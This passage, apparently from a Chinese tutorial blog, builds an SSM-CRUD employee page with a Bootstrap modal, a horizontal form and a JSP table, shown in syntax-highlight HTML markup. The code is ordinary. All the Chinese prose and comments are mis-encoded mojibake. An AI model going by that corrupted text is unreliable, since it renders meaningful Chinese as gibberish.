é€‰æ‹©æ¨¡æ€æ¡†</p><p>è¿™é‡Œè¸©äº†ä¸ªå‘ï¼Œç«Ÿç„¶æ˜¯bootstrapçš„å¼•ç”¨é¡ºåºé—®é¢˜</p><p>ä¿®æ”¹ä¸º<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">href</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attribute">rel</span>=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script <span class="attribute">src</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/js/jquery-3.5.1.min.js"</span> <span class="attribute">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script <span class="attribute">src</span>=<span class="string">"<span class="variable">$&#123;APP_PATH&#125;</span>/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>ä¸ç„¶ä¼šå¯¼è‡´æ¨¡æ€æ¡†æ— æ³•ä½¿ç”¨</p><p>æ¥ç€å‚è€ƒ <a href="https://v3.bootcss.com/css/#forms-horizontal" target="_blank" rel="noopener">bootstrapè¡¨å•</a> çš„æ°´å¹³è¡¨å•</p><p>å¤åˆ¶åˆ°modal-bodyä¸­<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;form <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-horizontal"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"inputEmail3"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;<span class="type">Email</span>&lt;/label&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">      &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"email"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"inputEmail3"</span> placeholder=<span class="string">"Email"</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"inputPassword3"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-2 control-label"</span>&gt;<span class="type">Password</span>&lt;/label&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-10"</span>&gt;</span><br><span class="line">      &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-control"</span> id=<span class="string">"inputPassword3"</span> placeholder=<span class="string">"Password"</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-offset-2 col-sm-10"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"checkbox"</span>&gt;</span><br><span class="line">        &lt;label&gt;</span><br><span class="line">          &lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"checkbox"</span>&gt; <span class="type">Remember</span> me</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-offset-2 col-sm-10"</span>&gt;</span><br><span class="line">      &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"submit"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span>&gt;<span class="type">Sign</span> in&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>åŸºæœ¬çš„æ¨¡æ€æ¡†ï¼ˆæœªåŠ æ•°æ®åº“æŸ¥æ‰¾ï¼‰<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- å‘˜å·¥æ·»åŠ çš„æ¨¡æ€æ¡† --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>å‘˜å·¥æ·»åŠ <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>ä¿å­˜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            